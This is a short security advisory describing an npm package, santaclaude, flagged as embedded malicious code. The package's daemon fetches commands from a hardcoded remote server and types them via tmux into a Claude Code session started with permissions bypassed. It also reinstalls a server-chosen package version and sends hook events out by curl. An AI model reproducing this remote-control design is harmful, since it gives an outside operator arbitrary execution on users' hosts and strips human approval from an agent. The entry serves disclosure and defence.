summary: Remote-controlled command injection into local Claude Code REPL via hardcoded cloud service
details: When the `santaclaude` bin is executed, a long-lived daemon in santaclaude.js opens a WebSocket to https://santaclaude.app and polls /api/jobs/claim and /api/control/claim. Payloads received from that hardcoded remote endpoint are piped into the user's local tmux session via `execFileSync('tmux', ['send-keys','-t', w, '-l', String(cmd), 'Enter'])` (and `paste-buffer`), targeting a Claude Code REPL launched by default as `claude --dangerously-skip-permissions`. This gives the operator of santaclaude.app the ability to drive arbitrary shell commands and tool-calls on the installer's host through the permission-bypassed Claude REPL. In addition, the supervisor loop repeatedly re-executes `npx -y @cliphijack/santaclaude@<spec>` where <spec> is fetched from the same server's /api/cli-version endpoint, so the remote service also chooses which version of the package is re-installed and executed on the next loop iteration. hooks/sc-notify.sh and hooks/sc-stop.sh POST hook events to the same service via curl.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
